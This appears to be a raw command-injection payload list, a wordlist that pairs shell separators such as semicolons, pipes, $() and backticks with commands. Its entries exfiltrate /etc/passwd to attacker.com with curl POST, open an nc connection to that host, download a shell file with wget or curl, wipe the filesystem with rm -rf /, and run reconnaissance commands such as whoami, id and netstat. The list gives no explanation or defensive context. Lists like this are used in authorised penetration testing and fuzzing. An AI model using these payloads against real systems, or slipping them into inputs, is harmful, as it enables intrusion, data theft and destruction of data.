; ping -c 4 example.com
| nc attacker.com 1234
$(wget -O /tmp/shell http://attacker.com/shell.txt)
`rm -rf /`
; rm -rf /*
| rm -rf /*
$(rm -rf /*)
; curl -X POST -d @/etc/passwd http://attacker.com
| curl -X POST -d @/etc/passwd http://attacker.com
$(curl -X POST -d @/etc/passwd http://attacker.com)
`echo 'exploited' > /tmp/exploit.txt`
; echo 'exploited' > /tmp/exploit.txt
| echo 'exploited' > /tmp/exploit.txt
$(echo 'exploited' > /tmp/exploit.txt)
; wget http://attacker.com/shell.txt -O /tmp/shell.txt
| wget http://attacker.com/shell.txt -O /tmp/shell.txt
$(wget http://attacker.com/shell.txt -O /tmp/shell.txt)
; curl http://attacker.com/shell.txt -o /tmp/shell.txt
| curl http://attacker.com/shell.txt -o /tmp/shell.txt
$(curl http://attacker.com/shell.txt -o /tmp/shell.txt)
`cat /etc/passwd`
; cat /etc/passwd
| cat /etc/passwd
$(cat /etc/passwd)
; cp /etc/passwd /tmp/passwd_copy
| cp /etc/passwd /tmp/passwd_copy
$(cp /etc/passwd /tmp/passwd_copy)
`ls -la /var/www/html`
; ls -la /var/www/html
| ls -la /var/www/html
$(ls -la /var/www/html)
; echo 'Hello, World!'
| echo 'Hello, World!'
$(echo 'Hello, World!')
`whoami`
; whoami
| whoami
$(whoami)
; id
| id
$(id)
; uname -a
| uname -a
$(uname -a)
; ifconfig
| ifconfig
$(ifconfig)
; netstat -an
| netstat -an
$(netstat -an)
; ps aux
| ps aux
$(ps aux)
; ls
; cat /etc/passwd
| ls
| cat /etc/passwd
$(ls)
$(cat /etc/passwd)
`ls`
`cat /etc/passwd`
;ls
;cat /etc/passwd
|ls
|cat /etc/passwd
&& ls
&& cat /etc/passwd
| ls
| cat /etc/passwd
|| ls
|| cat /etc/passwd
;& ls
;& cat /etc/passwd
| ls
| cat /etc/passwd
& ls
& cat /etc/passwd
; ls #
; cat /etc/passwd #
| ls #
| cat /etc/passwd #
&& ls #
&& cat /etc/passwd #
| ls #
| cat /etc/passwd #
|| ls #
|| cat /etc/passwd #
;& ls #
;& cat /etc/passwd #
| ls #
| cat /etc/passwd #
& ls #
& cat /etc/passwd #
; $(ls)
; $(cat /etc/passwd)
| $(ls)
| $(cat /etc/passwd)
&& $(ls)
&& $(cat /etc/passwd)